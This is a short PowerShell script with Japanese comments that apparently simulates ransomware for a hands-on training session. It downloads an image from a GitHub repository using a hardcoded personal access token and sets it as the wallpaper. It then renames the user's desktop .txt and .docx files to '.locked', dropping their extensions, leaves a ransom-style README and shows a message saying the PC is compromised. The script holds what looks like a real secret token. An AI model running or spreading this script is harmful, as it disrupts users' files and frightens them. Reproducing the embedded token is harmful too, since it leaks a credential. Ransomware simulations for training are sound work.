# PowerShellスクリプト：FakeRansom_JP_GitHubWall.ps1

# 設定
$token = "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" # PATを貼る
$url = "https://raw.githubusercontent.com/cyberattackerdemo/main/main/yourpcishacked.jpg"
$imgPath = "$env:PUBLIC\yourpcishacked.jpg"
$desktop = [Environment]::GetFolderPath("Desktop")

# ▼ 警告ファイル
$warning = @"
※今回はハンズオン用の演出のため、拡張子を元に戻せば問題なくファイルは元通りになります。
実際にはこのようなテキストファイルに身代金の支払い方法と締め切り日などが記載されます。
"@

# GitHubから画像ダウンロード
$headers = @{ Authorization = "token $token" }
$response = Invoke-WebRequest -Uri $url -Headers $headers -OutFile $imgPath

# 壁紙設定
$code = @"
using System.Runtime.InteropServices;

public class Wallpaper {
  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type $code
[Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)

# .txt, .docx ファイルを .locked にリネーム
Get-ChildItem $desktop -Include *.txt, *.docx -File | ForEach-Object {
    $newName = "$($_.BaseName).locked"
    Rename-Item $_.FullName -NewName $newName -Force
}

# 警告テキスト出力
$warning | Out-File -FilePath "$desktop\README_復元したい人用.txt" -Encoding utf8

# メッセージ表示
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("あなたのPCは侵害されました！復号キーが必要です。元に戻したい場合はDesktopのテキストファイルを確認してください。", "警告", 0, 'Warning')
